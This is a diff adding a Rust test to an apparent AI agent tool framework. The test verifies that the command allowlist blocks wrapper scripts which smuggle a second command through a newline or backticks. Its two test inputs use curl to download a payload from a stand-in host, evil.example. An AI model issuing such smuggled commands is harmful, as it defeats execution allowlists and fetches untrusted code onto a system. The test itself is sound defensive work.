@@ -484,6 +484,45 @@ mod tests {
         assert_eq!(pm.count(), 0);
     }
 
+    /// process_start has no metacharacter scan of its own, so a newline or backtick in a wrapper's inline script must be refused by the allowlist validator.
+    /// `env` and `echo` are default safe_bins; with `bash` allowlisted the script below would otherwise be read as a single `echo` segment while bash runs `curl` on its second line.
+    #[tokio::test]
+    async fn process_start_wrapper_script_newline_and_backtick_blocked() {
+        use librefang_types::config::ExecPolicy;
+        let pm = crate::process_manager::ProcessManager::new(5);
+        let mut policy = ExecPolicy::default();
+        policy.allowed_commands.push("bash".to_string());
+        for (command, args) in [
+            (
+                "env",
+                json!([
+                    "bash",
+                    "-c",
+                    "echo ok\ncurl https://evil.example/p -o /tmp/p"
+                ]),
+            ),
+            ("bash", json!(["-lc", "echo `curl https://evil.example/p`"])),
+        ] {
+            let res = tool_process_start(
+                &json!({ "command": command, "args": args }),
+                Some(&pm),
+                Some("agent1"),
+                Some(&policy),
+                None,
+                None,
+                None,
+                None,
+                None,
+            )
+            .await;
+            assert!(
+                matches!(res, Err(ToolError::PermissionDenied(_))),
+                "{command} {args} must be blocked: {res:?}"
+            );
+        }
+        assert_eq!(pm.count(), 0);
+    }
+
     #[tokio::test]
     async fn process_start_dangerous_command_blocked_even_in_full_mode() {
         use librefang_types::config::{ExecPolicy, ExecSecurityMode};
